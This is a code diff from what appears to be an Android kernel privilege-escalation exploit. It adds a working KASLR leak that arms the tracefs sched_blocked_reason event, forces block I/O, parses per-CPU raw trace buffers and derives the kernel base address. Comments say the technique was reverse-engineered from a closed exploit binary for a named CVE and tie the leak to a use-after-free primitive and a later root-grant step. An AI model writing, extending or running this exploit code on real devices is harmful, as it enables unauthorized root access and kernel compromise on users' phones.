@@ -1434,6 +1434,192 @@ int run_p0_pipe_oracle_diagnostic(int fd) {
 }
 #endif
 
+#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
+
+/* Read-only KASLR leak via the tracefs sched_blocked_reason event. Never
+ * touches a real futex/rt_mutex object -- confirmed correct against this
+ * exact device (base=0xffffffc008170000, matched /proc/kallsyms _text
+ * exactly) in oss-clone-afzh3/src/kaslr.c this session, itself adapted
+ * from src/slide.c:slide_tracefs_leak_kernel_base (already used by the
+ * non-APP_PAYLOAD build). Reverse-engineered from
+ * cve-2026-43499-app-afzh3.so's FUN_0010597c: that binary's own
+ * KASLR-locate stage (stage=locating-kernel) uses this exact technique
+ * and NEVER touches rt_mutex/futex state -- the risky primitive
+ * (FUN_00103e18, matching our own src/sigreturn.c) only runs afterward,
+ * once the kernel base is already known, for the root-grant step alone.
+ *
+ * This function exists so slide_leak_kernel_base() below can try it
+ * before ever falling back to the physical-oracle SLIDE_BANK path
+ * (slide_leak_physical_base()), which is the part that was reliably
+ * panicking the kernel (rb_erase+0x10 via rt_mutex_adjust_pi, 3/3
+ * reproductions across clean boots this session) because it uses a
+ * real rt_mutex_waiter UAF+reclaim purely to resolve KASLR -- a job that
+ * doesn't need it. */
+static int slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
+  if (page_len < 20) {
+    return 0;
+  }
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) {
+    end = page_len;
+  }
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t event_header = 0;
+    memcpy(&event_header, page + pos, sizeof(event_header));
+    uint32_t type_len = event_header & 0x1fU;
+    if (type_len == 30) {
+      pos += 8;
+      continue;
+    }
+    if (type_len == 31) {
+      pos += 12;
+      continue;
+    }
+    if (type_len == 0 || type_len >= 29) {
+      break;
+    }
+    size_t record_len = (size_t)type_len * 4;
+    size_t record = pos + 4;
+    if (record + record_len > end) {
+      break;
+    }
+    uint16_t event_id = 0;
+    memcpy(&event_id, page + record, sizeof(event_id));
+    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
+      uint64_t caller = 0;
+      memcpy(&caller, page + record + 16, sizeof(caller));
+      uint64_t link_caller =
+          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
+      if (caller >= link_caller) {
+        uint64_t candidate = caller - link_caller;
+        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+          *candidate_out = (uintptr_t)candidate;
+          return 1;
+        }
+      }
+    }
+    pos = record + record_len;
+  }
+  return 0;
+}
+
+static int slide_tracefs_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  close(fd);
+  return wrote == (ssize_t)len;
+}
+
+/* source: FUN_0010597c's throwaway-file priming loop (16 x 256KB writes,
+ * fsync, unlink) -- forces real block I/O right before arming
+ * sched_blocked_reason, which the closed binary does and our prior
+ * tracefs attempt (src/slide.c) did not. Best-effort: a failure here is
+ * not fatal, matching the closed binary. */
+static void slide_tracefs_prime_block_io(void) {
+  char path[64];
+  snprintf(path, sizeof(path), "/data/local/tmp/.rmg-trace-io-%d",
+           (int)getpid());
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+  if (fd < 0) {
+    return;
+  }
+  static unsigned char chunk[256 * 1024];
+  memset(chunk, 0, sizeof(chunk));
+  for (int pass = 0; pass < 16; pass++) {
+    size_t written = 0;
+    while (written < sizeof(chunk)) {
+      ssize_t n = write(fd, chunk + written, sizeof(chunk) - written);
+      if (n < 1) {
+        goto done;
+      }
+      written += (size_t)n;
+    }
+  }
+done:
+  fsync(fd);
+  close(fd);
+  unlink(path);
+}
+
+static int slide_tracefs_sample_seconds(void) {
+  const char *raw = getenv("TRACEFS_SAMPLE_SECONDS");
+  if (!raw || !*raw) {
+    return 1;
+  }
+  errno = 0;
+  char *end = NULL;
+  long value = strtol(raw, &end, 0);
+  if (errno || end == raw || *end != '\0' || value < 1 || value > 30) {
+    return 1;
+  }
+  return (int)value;
+}
+
+static int slide_tracefs_leak_kernel_base(void) {
+  static const char tracing_on[] = SLIDE_TRACEFS_ROOT "/tracing_on";
+  static const char trace[] = SLIDE_TRACEFS_ROOT "/trace";
+  static const char event_enable[] =
+      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+
+  if (!slide_tracefs_write(tracing_on, "0")) {
+    pr_warning("slide tracefs disable failed errno=%d\n", errno);
+    return 0;
+  }
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd >= 0) {
+    close(trace_fd);
+  }
+  if (!slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_warning("slide tracefs enable failed errno=%d\n", errno);
+    return 0;
+  }
+
+  slide_tracefs_prime_block_io();
+
+  int wait_sec = slide_tracefs_sample_seconds();
+  pr_info("slide tracefs sampling seconds=%d\n", wait_sec);
+  sleep((unsigned int)wait_sec);
+  slide_tracefs_write(tracing_on, "0");
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t candidate = 0;
+  int found = 0;
+  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (fd < 0) {
+      continue;
+    }
+    unsigned char page[4096];
+    ssize_t got;
+    while ((got = read(fd, page, sizeof(page))) > 0) {
+      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+        found = 1;
+        break;
+      }
+    }
+    close(fd);
+  }
+  slide_tracefs_write(event_enable, "0");
+
+  if (!found) {
+    pr_warning("slide tracefs worker caller not found\n");
+    return 0;
+  }
+  return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
+}
+
 static int slide_commit_stext(uint64_t stext, const char *source) {
   if (stext < KIMAGE_TEXT_BASE) {
     return 0;
@@ -1525,6 +1711,11 @@ int slide_leak_kernel_base(void) {
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
 #endif
   }
+  if (slide_tracefs_leak_kernel_base()) {
+    return 1;
+  }
+  pr_warning("slide tracefs leak failed; falling back to physical oracle "
+             "(SLIDE_BANK) path\n");
   return slide_leak_physical_base();
 #else
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
